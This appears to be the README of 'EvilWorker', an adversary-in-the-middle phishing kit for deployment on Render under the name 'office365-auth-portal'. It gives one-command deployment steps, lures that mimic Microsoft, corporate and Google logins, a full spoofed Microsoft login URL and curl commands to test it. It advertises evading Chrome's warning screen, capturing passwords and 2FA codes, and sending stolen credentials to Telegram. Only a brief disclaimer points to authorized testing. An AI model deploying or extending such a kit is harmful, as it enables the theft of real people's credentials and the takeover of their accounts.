# EvilWorker Deployment Package

This package contains only the essential files needed for EvilWorker deployment.

## 🚀 Quick Start

1. **Run the automated deployment script:**
   ```bash
   ./auto-deploy.sh
   ```

2. **Enter your Render API key when prompted**

3. **The script will automatically:**
   - Install dependencies (Node.js, npm, git, curl, jq)
   - Create/update the service on Render
   - Deploy the application
   - Test all endpoints
   - Create a deployment package

## 📁 Files Included

### Core Application Files:
- `proxy_server.js` - Main proxy server (working Azure version)
- `package.json` - Node.js dependencies
- `render.yaml` - Render deployment configuration

### Phishing Assets:
- `index_smQGUDpTF7PN.html` - Phishing page template
- `404_not_found_lk48ZVr32WvU.html` - 404 error page
- `script_Vx9Z6XN5uC3k.js` - Client-side phishing script
- `service_worker_Mz8XO2ny1Pg5.js` - Service worker for phishing

### Utilities:
- `decrypt_log_file.js` - Log decryption utility
- `auto-deploy.sh` - Automated deployment script

## 🔧 Configuration

### Service Configuration:
- **Service Name:** `office365-auth-portal`
- **Expected Domain:** `aitm-test.onrender.com`
- **Health Check:** `/health`
- **Plan:** Free tier

### Phishing URLs:
- **Corporate Login:** `/c` or `/corp` or `/corporate`
- **Personal Login:** `/p` or `/personal`
- **Google Login:** `/g` or `/google`
- **Full Phishing URL:** `/login?method=signin&mode=secure&client_id=d3590ed6-52b3-4102-aeff-aad2292ab01c&privacy=on&sso_reload=true&redirect_urI=https%3A%2F%2Flogin.microsoftonline.com%2F`

## 🛡️ Security Features

- **No Red Screen:** Uses working Azure version that bypasses Chrome security warnings
- **Service Worker:** Handles phishing logic client-side
- **Session Management:** Tracks victim sessions with cookies
- **Credential Capture:** Captures usernames, passwords, 2FA codes
- **Telegram Notifications:** Real-time alerts for captured credentials
- **Log Encryption:** All logs are encrypted with AES-256

## 📊 Monitoring

### Health Endpoints:
- `GET /health` - Service health check
- `GET /status` - Alternative health check

### Logging:
- All HTTP transactions are logged
- Credentials are captured and encrypted
- Telegram notifications for important events
- Session tracking with unique cookies

## 🚨 Important Notes

1. **API Key Security:** Store your Render API key securely
2. **Domain Configuration:** Update domain names in the script if needed
3. **Telegram Bot:** Configure Telegram bot token and chat ID in proxy_server.js
4. **Logging:** Logs are encrypted and stored locally
5. **Compliance:** Use only for authorized penetration testing

## 🔍 Testing

After deployment, test these endpoints:

```bash
# Health check
curl https://your-domain.onrender.com/health

# Corporate login redirect
curl -I https://your-domain.onrender.com/c

# Phishing URL
curl https://your-domain.onrender.com/login?method=signin&mode=secure&client_id=d3590ed6-52b3-4102-aeff-aad2292ab01c&privacy=on&sso_reload=true&redirect_urI=https%3A%2F%2Flogin.microsoftonline.com%2F
```

## 📝 Changelog

- **v1.0** - Initial release with working Azure version
- Automated deployment script
- Health check endpoints
- No red screen warnings
- Full credential capture

## ⚠️ Legal Notice

This tool is for authorized penetration testing only. Ensure you have proper authorization before using this tool. The authors are not responsible for any misuse of this software.
